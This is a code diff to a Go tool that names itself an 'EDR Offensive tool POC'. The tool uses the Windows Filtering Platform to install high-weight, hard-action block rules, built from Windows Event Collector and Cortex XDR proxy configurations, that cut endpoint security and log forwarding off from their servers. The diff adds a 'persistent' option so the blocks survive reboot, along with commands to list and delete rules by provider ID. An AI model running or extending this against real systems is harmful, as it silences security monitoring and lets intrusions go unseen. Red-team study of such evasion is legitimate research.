@@ -246,7 +246,101 @@ func read() {
 	}
 }
 
-func install(configFile string) {
+func read_rules(PrintProviderID string) {
+	session, err := wf.New(&wf.Options{
+		Name:    "EDR Offensive tool POC with WFP",
+		Dynamic: true,
+	})
+	if err != nil {
+		fmt.Println("[!] Error creating new WFP session !\n\nAre you sure to be running with privileges ?")
+		log.Fatal(err)
+	}
+
+	fmt.Println("[+] Created new Session name = 'EDR Offensive tool POC WITH wfp'")
+	ReadProvider, err := session.Providers()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println("\n")
+	fmt.Printf("| %-38s | %-55s | %-80s\n", "ProviderID", "ProviderName", "Description")
+	fmt.Println("------------------------------------------------------------------------------------------------------------------------------------------------------------------")
+	for _, FoundProvider := range ReadProvider {
+		if FoundProvider.ID.String() == PrintProviderID {
+			fmt.Printf("| %-38s | %-55s | %-80s\n", FoundProvider.ID.String(), FoundProvider.Name, FoundProvider.Description)
+		}
+	}
+	fmt.Println("\n")
+	Readsublayer, err := session.Sublayers()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Printf("| %-38s | %-38s | %-60s | %-10s | %-4s\n", "ProviderID", "SubLayerID", "SublayerName", "Weight", "Persistent")
+	fmt.Println("----------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
+	for _, FoundSubLayer := range Readsublayer {
+		if FoundSubLayer.Provider.String() == PrintProviderID {
+			fmt.Printf("| %-38s | %-38s | %-60s | %-10d | %-10t\n", FoundSubLayer.Provider, FoundSubLayer.ID.String(), FoundSubLayer.Name, FoundSubLayer.Weight, FoundSubLayer.Persistent)
+		}
+	}
+	fmt.Println("\n")
+	ReadRules, err := session.Rules()
+	fmt.Printf("| %-38s | %-38s | %-60s | %-10s | %-4s | %-4s\n", "RuleID", "RuleName", "Match condition(s)", "Action", "Persistent", "Boot")
+	mycondition := ""
+	for _, FoundRule := range ReadRules {
+		if FoundRule.Provider.String() == PrintProviderID {
+			if len(FoundRule.Conditions) != 0 {
+				fmt.Println("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
+				myfirstline := true
+				for _, entry := range FoundRule.Conditions {
+					mycondition = entry.String()
+					if myfirstline {
+						fmt.Printf("| %-38s | %-38s | %-60s | %-10s | %-10t | %-10t\n", FoundRule.ID.String(), FoundRule.Name, mycondition, FoundRule.Action.String(), FoundRule.Persistent, FoundRule.BootTime)
+						myfirstline = false
+					} else {
+						fmt.Printf("| %-38s | %-38s | %-60s | %-10s | %-10s | %-10s\n", "", "", mycondition, "", "", "")
+					}
+				}	
+			}
+		}
+	}
+
+}
+
+
+
+func delete_rule(Provider_ID_to_be_deleted string) {
+	
+	session, err := wf.New(&wf.Options{
+		Name:    "EDR Offensive tool POC with WFP",
+		Dynamic: true,
+	})
+	if err != nil {
+		fmt.Println("[!] Error creating new WFP session !\n\nAre you sure to be running with privileges ?")
+		log.Fatal(err)
+	}
+	
+	fmt.Println("[+] Created new Session name = 'EDR Offensive tool POC WITH wfp'")
+	fmt.Println("[+] Attempting to delete all rules from ProviderID  = ",Provider_ID_to_be_deleted )
+	ReadRules, err := session.Rules()
+	mycount := 0
+	for _, FoundRule := range ReadRules {
+		if FoundRule.Provider.String() == Provider_ID_to_be_deleted {
+			fmt.Println("[-] Deleting rule ID = ",FoundRule.ID.String() )
+			errdelete := session.DeleteRule(FoundRule.ID)
+			if errdelete != nil {
+				panic(errdelete)
+			}
+			mycount += 1
+		}
+	}
+	/*
+	RuleID, _ := windows.GUIDFromString(RuleID_to_be_deleted)
+	
+	*/
+	fmt.Println("[+] Deleted ",mycount, " rules" )
+
+}
+
+func install(configFile string, makepersistent bool) {
 	// Check if the config file path is provided as an argument
 
 	// Get the config file path from command-line arguments
@@ -283,7 +377,7 @@ func install(configFile string) {
 	err = session.AddProvider(&wf.Provider{
 		ID:         providerID,
 		Name:       config.Provider.Provider_name,
-		Persistent: false,
+		Persistent: makepersistent,
 	})
 	if err != nil {
 		fmt.Println(err)
@@ -301,6 +395,7 @@ func install(configFile string) {
 		ID:       sublayerID,
 		Name:     config.Sublayer.Sublayer_name,
 		Provider: providerID,
+		Persistent: makepersistent,
 		Weight:   0xffff, // the highest possible weight
 
 	})
@@ -367,11 +462,11 @@ func install(configFile string) {
 			Layer:      layer,
 			Sublayer:   sublayerID,
 			Provider:   providerID,
-			Persistent: false, // no need to keep rule if process exits.
 			HardAction: true,  //rule cannot be overriden except by a Veto
 			Action:     wf.ActionBlock,
 			Weight:     1000,
 			Conditions: conds,
+			Persistent: makepersistent,
 		})
 		if err != nil {
 			log.Print("ERROR: ", err)
@@ -445,11 +540,14 @@ func install(configFile string) {
 		}
 	}
 
-	fmt.Println("==> Press ENTER to finish and remove tempory WFP rules...")
-	reader := bufio.NewReader(os.Stdin)
-	_, _ = reader.ReadString('\n')
-	fmt.Println("[+] Finished")
-
+	if makepersistent {
+		fmt.Println("[+] Finished persistent installation")
+	} else {
+		fmt.Println("==> Press ENTER to finish and remove tempory WFP rules...")
+		reader := bufio.NewReader(os.Stdin)
+		_, _ = reader.ReadString('\n')
+		fmt.Println("[+] Finished tempory installation")
+	}
 }
 
 func main() {
@@ -458,22 +556,33 @@ func main() {
 		os.Exit(1)
 	}
 	printFlag := flag.Bool("print", false, "Print WFP Providers and SubLayers")
+	providerIDFlag := flag.String("providerID", "", "Specify Provider ID with print")
 	installFlag := flag.Bool("install", false, "Install WFP rules (requires the file option)")
+	persistentFlag := flag.Bool("persistent", false, "in combination with -install to make them permanent")
 	fileFlag := flag.String("file", "", "Specify a json file path")
 	getwecflag := flag.Bool("getwec", false, "Get WEC Config and generate a WFP config")
 	getcortexflag := flag.Bool("getcortex", false, "Get Cortex XDR proxy config and generate a WFP config")
 	outputFlag := flag.String("output", "", "Specify output file. To be used in conjonction with generating with getwec or getcortex")
+	deleteRuleFlag := flag.String("deleteproviderID", "", "Delete all rules from ProviderID")
 	flag.Parse()
 
 	// Let's print Provider IDs and SubLayer IDs
 	if *printFlag {
-		read()
+		if *providerIDFlag != "" {
+			read_rules(*providerIDFlag)
+		} else {
+			read()
+		}
+		os.Exit(0)
+	}
+	if *deleteRuleFlag != "" {
+		delete_rule(*deleteRuleFlag)
 		os.Exit(0)
 	}
 
 	if *installFlag {
 		if *fileFlag != "" {
-			install(*fileFlag)
+			install(*fileFlag, *persistentFlag)
 		} else {
 			log.Fatal("-install option requires -file value")
 		}
